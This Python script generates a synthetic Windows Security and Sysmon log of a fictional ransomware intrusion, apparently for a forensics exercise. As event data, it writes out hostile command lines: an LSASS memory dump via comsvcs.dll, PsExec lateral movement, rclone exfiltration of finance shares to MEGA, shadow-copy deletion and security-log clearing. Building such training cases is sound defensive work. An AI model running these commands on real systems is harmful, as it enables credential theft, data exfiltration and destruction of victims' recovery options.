"""Write case/events.jsonl: a fictional LockBit 3.0-style intrusion at Harbor Lane Logistics (HLL),
as a Windows Security + Sysmon export, buried in a working night's noise.
Deterministic: run it again and the file is byte-for-byte the same. Descriptive only: log records,
no tooling. Usage: python3 tools/make_events.py > case/events.jsonl
"""
import json
import random
from datetime import datetime, timedelta

rnd = random.Random(1809)
T0 = datetime(2026, 10, 18, 0, 0, 0)
events = []

def add(minute, host, channel, eid, **f):
    t = T0 + timedelta(seconds=int(minute * 60))
    events.append({"UtcTime": t.strftime("%Y-%m-%d %H:%M:%S"), "Computer": host, "Channel": channel,
                   "EventID": eid, **f})

def proc(minute, host, image, cmd, parent, user):
    add(minute, host, "Sysmon", 1, Image=image, CommandLine=cmd, ParentImage=parent, User=user)

WS = ["HLL-WS014", "HLL-WS022", "HLL-WS031"]
STAFF = {"HLL-WS014": "HLL\\maya.ortiz", "HLL-WS022": "HLL\\dev.patel", "HLL-WS031": "HLL\\sam.nguyen"}
SYS = "NT AUTHORITY\\SYSTEM"

# --- noise over the whole night (00:00-06:00) ---
for _ in range(900):
    m = rnd.uniform(0, 360)
    h = rnd.choice(WS + ["HLL-FS01", "HLL-DC01", "HLL-RDS01"])
    kind = rnd.random()
    if h in WS and kind < 0.5:
        u = STAFF[h]
        img, cmd = rnd.choice([
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
            ("C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE /dde"),
        ])
        proc(m, h, img, cmd, "C:\\Windows\\explorer.exe", u)
    elif kind < 0.75:
        proc(m, h, "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p", "C:\\Windows\\System32\\services.exe", SYS)
    elif kind < 0.9:
        add(m, h, "Security", 4624, TargetUserName=rnd.choice(list(STAFF.values())).split("\\")[1],
            IpAddress="10.30.0.%d" % rnd.randint(20, 60), LogonType=3)
    else:
        proc(m, h, "C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe", "C:\\Windows\\System32\\svchost.exe", SYS)

# The backup job lists shadow copies every night: not malicious.
for m in (30, 150, 270):
    proc(m, "HLL-FS01", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe list shadows", "C:\\Program Files\\HLLBackup\\agent.exe", "HLL\\svc_backup")
# Someone mistypes their password a few times: also not the attack.
for i in range(3):
    add(95 + i * 0.2, "HLL-RDS01", "Security", 4625, TargetUserName="maya.ortiz", IpAddress="10.30.0.41", LogonType=10)

# --- the intrusion ---
ATT = "203.0.113.61"
guesses = ["administrator", "admin", "scan", "backup", "svc_scan", "test", "rdp", "helpdesk"]
for i in range(46):
    add(72 + i * 0.05, "HLL-RDS01", "Security", 4625, TargetUserName=guesses[i % 8], IpAddress=ATT, LogonType=10)
add(75, "HLL-RDS01", "Security", 4624, TargetUserName="svc_scan", IpAddress=ATT, LogonType=10)
U = "HLL\\svc_scan"
proc(77, "HLL-RDS01", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all", "C:\\Windows\\explorer.exe", U)
proc(81, "HLL-RDS01", "C:\\Users\\svc_scan\\Music\\netscan.exe", "netscan.exe /hide /range:10.30.0.1-10.30.0.254", "C:\\Windows\\System32\\cmd.exe", U)
proc(94, "HLL-RDS01", "C:\\Windows\\System32\\rundll32.exe",
     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\ProgramData\\m.dmp full", "C:\\Windows\\System32\\cmd.exe", U)
add(99, "HLL-RDS01", "Security", 4624, TargetUserName="adm.jkeller", IpAddress="10.30.0.15", LogonType=9)
for tgt in ("HLL-FS01", "HLL-DC01"):
    proc(126 if tgt == "HLL-FS01" else 131, "HLL-RDS01", "C:\\Users\\svc_scan\\Music\\PsExec64.exe",
         "PsExec64.exe \\\\%s -accepteula -s cmd.exe" % tgt, "C:\\Windows\\System32\\cmd.exe", "HLL\\adm.jkeller")
    add(126.1 if tgt == "HLL-FS01" else 131.1, tgt, "Security", 4624, TargetUserName="adm.jkeller", IpAddress="10.30.0.15", LogonType=3)
    proc(126.2 if tgt == "HLL-FS01" else 131.2, tgt, "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\System32\\services.exe", SYS)

proc(160, "HLL-FS01", "C:\\ProgramData\\rc\\rclone.exe",
     "rclone.exe copy D:\\Shares\\Finance mega:hll-q3 --transfers 12 --no-check-certificate", "C:\\Windows\\System32\\cmd.exe", SYS)
for i in range(30):
    add(160.5 + i * 1.5, "HLL-FS01", "Sysmon", 3, Image="C:\\ProgramData\\rc\\rclone.exe", DestinationIp="198.51.100.140",
        DestinationHostname="gfs262n301.userstorage.mega.co.nz", DestinationPort=443)

# Group Policy pushes a scheduled task that starts the encryptor everywhere.
proc(215, "HLL-DC01", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "powershell.exe -c New-GPO -Name WinUpd | New-GPLink -Target 'DC=hll,DC=local'", "C:\\Windows\\PSEXESVC.exe", SYS)
proc(216, "HLL-DC01", "C:\\Windows\\System32\\cmd.exe",
     "cmd.exe /c copy C:\\ProgramData\\upd.exe \\\\HLL-DC01\\NETLOGON\\upd.exe", "C:\\Windows\\PSEXESVC.exe", SYS)

EXT = "k9f2HqZ1p"
victims = ["HLL-FS01", "HLL-WS014", "HLL-WS022"]   # WS031 was switched off; DC01 only hosted the GPO
for n, h in enumerate(victims):
    m = 240 + n * 3
    proc(m, h, "C:\\Windows\\Temp\\upd.exe", "C:\\Windows\\Temp\\upd.exe -pass 7d1e", "C:\\Windows\\System32\\svchost.exe", SYS)
    proc(m + 0.2, h, "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "C:\\Windows\\Temp\\upd.exe", SYS)
    proc(m + 0.3, h, "C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe cl Security", "C:\\Windows\\Temp\\upd.exe", SYS)
    docs = ["Q3-forecast.xlsx", "payroll-oct.csv", "contracts\\carrier-2026.pdf", "fleet-maint.docx", "invoices\\INV-55102.pdf"]
    for i, d in enumerate(docs):
        add(m + 1 + i * 0.1, h, "Sysmon", 11, Image="C:\\Windows\\Temp\\upd.exe",
            TargetFilename="C:\\Users\\Public\\Documents\\%s.%s" % (d, EXT))
    add(m + 2, h, "Sysmon", 11, Image="C:\\Windows\\Temp\\upd.exe", TargetFilename="C:\\Users\\Public\\Documents\\%s.README.txt" % EXT)
    add(m + 2.1, h, "Sysmon", 13, Image="C:\\Windows\\Temp\\upd.exe",
        TargetObject="HKU\\.DEFAULT\\Control Panel\\Desktop\\WallPaper", Details="C:\\ProgramData\\%s.bmp" % EXT)
    proc(m + 2.5, h, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c ping 127.0.0.7 -n 3 > nul & del /f /q C:\\Windows\\Temp\\upd.exe",
         "C:\\Windows\\Temp\\upd.exe", SYS)

events.sort(key=lambda e: (e["UtcTime"], e["Computer"], e["EventID"]))
for i, e in enumerate(events, start=10001):
    print(json.dumps({"RecordID": i, **e}, separators=(",", ":")))
